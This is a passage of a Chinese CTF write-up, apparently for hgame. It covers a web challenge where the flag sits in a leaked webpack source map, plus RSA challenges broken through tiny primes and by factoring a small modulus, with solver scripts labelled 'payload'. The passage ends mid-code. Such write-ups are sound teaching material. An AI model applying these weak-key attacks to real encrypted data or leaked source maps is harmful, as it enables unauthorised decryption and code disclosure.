3）其他语言编译成 JavaScript。最常见的例子就是 CoffeeScript。</p>
<p>jQuery 1.9 压缩后只有 3 行，每行 3 万个字符，所有内部变量都改了名字。你看着报错信息，感到毫无头绪，根本不知道它所对应的原始位置。<br />
这就是 Source map 想要解决的问题。</p>
<p>简单说，Source map 就是一个信息文件，里面储存着位置信息。也就是说，转换后的代码的每一个位置，所对应的转换前的位置。<br />
有了它，出错的时候，除错工具将直接显示原始代码，而不是转换后的代码。这无疑给开发者带来了很大方便。<br />
目前，暂时只有 Chrome 浏览器支持这个功能</p>
<p>如何使用 Source map 呢？其实只要在转换后的代码尾部，加上一行就可以了。</p>
<pre><code class="language-JavaScript">    　　//@ sourceMappingURL=/path/to/file.js.map
</code></pre>
<p>map 文件可以放在网络上，也可以放在本地文件系统。</p>
<p>Source map 的格式，它大概是这个样子：</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>&#123;</pre></td></tr><tr><td data-num="2"></td><td><pre>    　　　　version : 3,</pre></td></tr><tr><td data-num="3"></td><td><pre>    　　　　file: "out.js",</pre></td></tr><tr><td data-num="4"></td><td><pre>    　　　　sourceRoot : "",</pre></td></tr><tr><td data-num="5"></td><td><pre>    　　　　sources: ["foo.js", "bar.js"],</pre></td></tr><tr><td data-num="6"></td><td><pre>    　　　　names: ["src", "maps", "are", "fun"],</pre></td></tr><tr><td data-num="7"></td><td><pre>    　　　　mappings: "AAgBC,SAAQ,CAAEA"</pre></td></tr><tr><td data-num="8"></td><td><pre>    　　&#125;</pre></td></tr></table></figure><p>那么回到正文，这题我们提示用 Chrome 打开去看看。</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/02/e71c9e49bffe5710.png" alt="" /></p>
<p>发现源文件里多出一个文件夹，这是 webpack 打包 js 时开启了 sourcemap，而 chrome 又还原了源码</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/02/bc9b117600ac9ea8.png" alt="" /></p>
<p D0nt_f0r9et_2_ClOs3_S0urce_m@p="">两次 base64 解码后得到: hgame</p>
<h1 id="crypto"><a class="anchor" href="#crypto">#</a> Crypto</h1>
<h2 id="easy-rsa"><a class="anchor" href="#easy-rsa">#</a> Easy RSA</h2>
<p>源码</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> math <span class="token keyword">import</span> gcd</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> random <span class="token keyword">import</span> randint</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> next_prime</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    e <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p <span class="token operator">*</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">while</span> gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        e <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>next_prime<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">return</span> e<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> p <span class="token operator">*</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>encrypt<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token comment"># [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)]</span></pre></td></tr></table></figure><p>这题其实很好理解，就是要我们求出被 encrypt () 函数加密的 flag</p>
<p>payload</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> math <span class="token keyword">import</span> gcd</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> random <span class="token keyword">import</span> randint</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> next_prime</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="6"></td><td><pre>xx<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">293</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">31548</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">26459</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">4778</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">27479</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">32728</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">9029</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">20696</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">4649</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">13418</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">11783</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">14239</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">13537</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">11702</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3835</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">20051</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">30983</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">23928</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">17581</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">5855</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">35381</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">37774</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">2357</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">1849</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">22649</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">7348</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1151</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">17982</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">8431</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">30226</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">38501</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">30559</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">14549</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">21143</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">24781</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">45604</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">8051</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">7994</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">863</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">11493</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1117</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">12579</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">7561</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">8960</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">19813</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">53463</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">4943</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">14606</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">29077</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">33446</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">18583</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">31800</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">30643</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">27293</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">11617</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">13448</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">19051</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">21676</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">18367</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">14139</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">18861</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">5139</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">9581</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">25595</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">for</span> fine <span class="token keyword">in</span> xx<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    e<span class="token operator">=</span>fine<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    p<span class="token operator">=</span>fine<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    q<span class="token operator">=</span>fine<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">#e=30241</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">#p=157</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">#q=251</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    c<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>      a<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>      <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">==</span>fine<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>         <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>   <span class="token comment">#hgame&#123;&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">#list(map(encrypt, flag))=[(293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)]</span></pre></td></tr></table></figure><h2 id="rsa-attack"><a class="anchor" href="#rsa-attack">#</a> RSA Attack</h2>
<p>源码</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> libnum <span class="token keyword">import</span> s2n</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>m <span class="token operator">=</span> s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="8"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="11"></td><td><pre>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e ="</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c ="</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">#e = 65537</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">#n = 700612512827159827368074182577656505408114629807</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">#c = 122622425510870177715177368049049966519567512708</span></pre></td></tr></table></figure><p>yafu 分解大数 n</p>
<p>payload</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre>p <span class="token operator">=</span> <span class="token number">715800347513314032483037</span></pre></td></tr><tr><td data-num="3"></td><td><pre>q <span class="token operator">=</span> <span class="token number">978782023871716954857211</span></pre></td></tr><tr><td data-num="4"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="5"></td><td><pre>c <span class="token operator">=</span> <span class="token number">122622425510870177715177368049049966519567512708</span></pre></td></tr><tr><td data-num="6"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="7"></td><td><pre>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>m<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="rsa-attack2"><a class="anchor" href="#rsa-attack2">#</a> RSA Attack2</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> math <span class="token keyword">import</span> ceil</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> libnum <span class="token keyword">import</span> s2n</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>flag_parts <span class="token operator">=</span> <span class="token string">"这里有段调试了很久blog上传一直debug，看源码就去百度吧"</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"# task1"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>m <span class="token operator">=</span> flag_parts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="12"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="13"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>r <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>n1 <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="17"></td><td><pre>c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>n2 <span class="token operator">=</span> r <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="19"></td><td><pre>c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e ="</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n1 ="</span><span class="token punctuation">,</span> n1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 ="</span><span class="token punctuation">,</span> c1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n2 ="</span><span class="token punctuation">,</span> n2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 ="</span><span class="token punctuation">,</span> c2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"# task2"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>m <span class="token operator">=</span> flag_parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="28"></td><td><pre>e <span class="token operator">=</span> <span class="token number">7</span></pre></td></tr><tr><td data-num="29"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="32"></td><td><pre>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e ="</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c ="</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"# task3"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>m <span class="token operator">=</span> flag_parts<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="39"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="42"></td><td><pre>e1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>e2 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> n<span class="token 